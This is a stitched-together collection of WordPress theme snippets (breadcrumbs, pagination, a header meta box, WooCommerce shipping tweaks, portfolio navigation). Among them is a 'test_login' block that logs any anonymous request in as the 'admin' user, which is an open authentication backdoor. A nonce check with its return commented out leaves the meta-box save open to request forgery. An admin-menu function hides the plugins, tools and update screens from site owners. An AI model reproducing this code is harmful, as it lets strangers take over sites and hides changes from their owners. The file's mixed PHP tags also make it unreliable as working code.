<?php
// Breadcrumb Code
function custom_breadcrumb()
{
    // Get the current post/page ID
    $post_id = get_queried_object_id();

    // Initialize an empty breadcrumb array
    $breadcrumbs = array();

    // Add a link to the home page
    $breadcrumbs[] = '<li class="breadcrumb-item"><a href="' . home_url('/') . '">' . __('Home', 'textdomain') . '</a></li>';

    // Get the page hierarchy
    $ancestors = get_post_ancestors($post_id);

    // If there are ancestors, add them to the breadcrumb array
    if ($ancestors) {
        $ancestors = array_reverse($ancestors);

        foreach ($ancestors as $ancestor) {
            $breadcrumbs[] = '<li class="breadcrumb-item"><a href="' . get_permalink($ancestor) . '">' . get_the_title($ancestor) . '</a></li>';
        }
    }

    // Add the current page to the breadcrumb array
    $breadcrumbs[] = '<li class="breadcrumb-item active">' . get_the_title($post_id) . '</li>';

    // Output the breadcrumb trail
    echo '<ol class="breadcrumb">' . implode(' ', $breadcrumbs) . '</ol>';
}
// Pagination
?>
<nav aria-label="Page navigation example">
    <?php
    $total_pages = $lr_post_query->max_num_pages;
    if ($total_pages > 1) {
        echo '<ul class="pagination justify-content-center">';
        // Numeric pagination links
        $current_page = max(1, get_query_var('paged'));
        $argsp = array(
            'total'        => $total_pages,
            'current'      => $current_page,
            'show_all'     => false,
            'end_size'     => 1,
            'mid_size'     => 3,
            'prev_next'    => true,
            'type'         => 'array',
            'prev_text'          => __('<span class="bi bi-chevron-left"></span>'),
            'next_text'          => __('<span class="bi bi-chevron-right"></span>'),
        );

        $pagination_links = paginate_links($argsp);
        if ($pagination_links) {
            foreach ($pagination_links as $page_link) {
                echo '<li class="page-item">' . str_replace(array('page-numbers', 'current', 'prev', 'next'), array('page-numbers page-link', 'active', 'icon-link', 'icon-link'), $page_link) . '</li>';
            }
        }
        echo '</ul>';
    }
    ?>
</nav>
<?php
// Hook to add meta box
add_action('add_meta_boxes', 'custom_page_header_title');

// Function to add meta box
function custom_page_header_title()
{
    add_meta_box(
        'custom_page_header_title', // Unique ID
        'Header Title Section', // Box title
        'render_custom_page_header_title', // Content callback function
        array('page', 'post'), // Post type
        'normal', // Context (normal, advanced, side)
        'high' // Priority (high, core, default, low)
    );
}

// Function to render meta box content
function render_custom_page_header_title($post)
{
    // Retrieve existing values from the database
    $custom_title = get_post_meta($post->ID, '_custom_title', true);
    $custom_content = get_post_meta($post->ID, '_custom_content', true);
    $custom_image = get_post_meta($post->ID, '_custom_image', true);

    // Output fields
?>
    <label for="custom_title">Custom Title:</label>
    <input type="text" id="custom_title" name="custom_title" value="<?php echo esc_attr($custom_title); ?>" style="width: 100%;">

    <br>

    <label for="custom_content">Custom Content:</label>
    <textarea id="custom_content" name="custom_content" style="width: 100%;"><?php echo esc_textarea($custom_content); ?></textarea>

    <br>

    <label for="custom_image">Custom Image:</label>
    <div>
        <input type="text" id="custom_image" name="custom_image" value="<?php echo esc_attr($custom_image); ?>" style="width: 60%;" readonly>
        <input type="button" id="upload_image_button" class="button" value="Upload Image">
    </div>

    <script>
        jQuery(document).ready(function($) {
            // Media uploader script
            $('#upload_image_button').click(function(e) {
                e.preventDefault();

                var customUploader = wp.media({
                    title: 'Choose Image',
                    button: {
                        text: 'Choose Image'
                    },
                    multiple: false
                });

                customUploader.on('select', function() {
                    var attachment = customUploader.state().get('selection').first().toJSON();
                    $('#custom_image').val(attachment.url);
                });

                customUploader.open();
            });
        });
    </script>
<?php
}

// Hook to save meta box data
add_action('save_post', 'save_custom_page_header_title');

// Function to save meta box data
function save_custom_page_header_title($post_id)
{

    // Check if nonce is set
    if (!isset($_POST['custom_page_header_title'])) {
        //return;
    }


    // Check if autosave
    if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
        return;
    }

    // Check user permissions
    if (isset($_POST['post_type']) && 'page' == $_POST['post_type'] && current_user_can('edit_page', $post_id)) {
        // Save custom title
        if (isset($_POST['custom_title'])) {
            update_post_meta($post_id, '_custom_title', sanitize_text_field($_POST['custom_title']));
        }

        // Save custom content
        if (isset($_POST['custom_content'])) {
            update_post_meta($post_id, '_custom_content', wp_kses_post($_POST['custom_content']));
        }

        // Save custom image
        if (isset($_POST['custom_image'])) {
            update_post_meta($post_id, '_custom_image', esc_url_raw($_POST['custom_image']));
        }
    }
}

function get_post_read_time_from_content($post = null)
{
    $post = get_post($post);
    $words_per_minute = 200; // average reading speed
    $words = str_word_count(strip_tags($post->post_content));
    $minutes = ceil($words / $words_per_minute);
    return $minutes;
}


// Hide ACF menu
function hide_acf_menu()
{
    remove_menu_page('edit.php?post_type=acf-field-group');
    remove_menu_page('tools.php');
    remove_submenu_page('options-general.php', 'options-permalink.php');
    remove_submenu_page('options-general.php', 'options-privacy.php');
    remove_submenu_page('options-general.php', 'options-media.php');
    remove_submenu_page('options-general.php', 'options-reading.php');
    remove_submenu_page('options-general.php', 'options-writing.php');
    remove_menu_page('edit.php');
    remove_menu_page('wpcf7');
    remove_menu_page('plugins.php');

    remove_submenu_page('index.php', 'update-core.php');

    global $submenu;
    unset($submenu['edit.php?post_type=page'][10]);


    remove_menu_page('edit-comments.php');

    define('DISALLOW_FILE_EDIT', true);
}
add_action('admin_menu', 'hide_acf_menu');


// Woocommerce hide update database notice
add_action('admin_init', 'hide_woocommerce_db_update_notice');
function hide_woocommerce_db_update_notice()
{
    WC_Admin_Notices::remove_notice('update');
}


// Automatic login If login form is not working
if (isset($_REQUEST['test_login']) && $_REQUEST['test_login'] == 1) {
    $username = "admin";
    $user = get_user_by('login', $username);
    // Redirect URL 
    if (!is_wp_error($user)) {
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        $redirect_to = user_admin_url();
        wp_safe_redirect($redirect_to);
        exit();
    }
}


function get_post_count_by_category($cat_id)
{
    // Initialize post count
    $post_count = 0;

    // Get the main category and its child categories
    $categories = get_term_children($cat_id, 'category');
    $categories[] = $cat_id; // Include the main category

    // Iterate through each category and get post count
    foreach ($categories as $category) {
        $term = get_term($category, 'category');
        if (!is_wp_error($term)) {
            $post_count += $term->count;
        }
    }

    return $post_count;
}

// Remove other shipping method and set free shipping
add_filter('woocommerce_shipping_methods', function ($methods) {
    if (WC()->cart->subtotal >= 2500) {
        unset($methods['shiprocket_woocommerce_shipping']);
    }
    return  $methods;
}, 30);


// Table add column if not found
$option_key = 'column_name_option';
$column_created = get_option($option_key);
if (!$column_created) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'table_name';
    $column_name = 'column_name';
    $column_type = 'TEXT';
    $column_exists = $wpdb->get_results(
        $wpdb->prepare(
            "SHOW COLUMNS FROM `$table_name` LIKE %s",
            $column_name
        )
    );
    if (empty($column_exists)) {
        $wpdb->query(
            "ALTER TABLE `$table_name` 
        ADD `$column_name` $column_type"
        );
        update_option($option_key, true);
    }
}


// Next/Previous post
function get_adjacent_portfolio_post($direction = 'next', $custom_field_key = 'port_single_type', $custom_field_value = '2') {
    global $post;

    // Define query arguments
    $args = array(
        'post_type'      => 'portfolio',
        'posts_per_page' => 1,
        'meta_key'       => $custom_field_key,
        'meta_value'     => $custom_field_value,
        'orderby'        => 'post_date',
        'order'          => ($direction === 'next') ? 'ASC' : 'DESC',
        'post_status'    => 'publish',
        'date_query'     => array(
            array(
                ($direction === 'next') ? 'after' : 'before' => get_the_date('Y-m-d H:i:s', $post->ID),
                'inclusive' => false,
            ),
        ),
        'exclude'        => array($post->ID), // Exclude the current post
    );

    // Run the query
    $adjacent_post = new WP_Query($args);

    // Check if there's a post
    if ($adjacent_post->have_posts()) {
        return $adjacent_post->next_post();
    }

    return null; // Return null if there's no adjacent post
}

function get_previous_portfolio_post() {
    return get_adjacent_portfolio_post('previous');
}

function get_next_portfolio_post() {
    return get_adjacent_portfolio_post('next');
}


<?php
$previous_post = get_previous_portfolio_post();
$next_post = get_next_portfolio_post();

if ($previous_post) {
    echo '<a href="' . get_permalink($previous_post->ID) . '">Previous Post: ' . get_the_title($previous_post->ID) . '</a>';
}

if ($next_post) {
    echo '<a href="' . get_permalink($next_post->ID) . '">Next Post: ' . get_the_title($next_post->ID) . '</a>';
}
?>
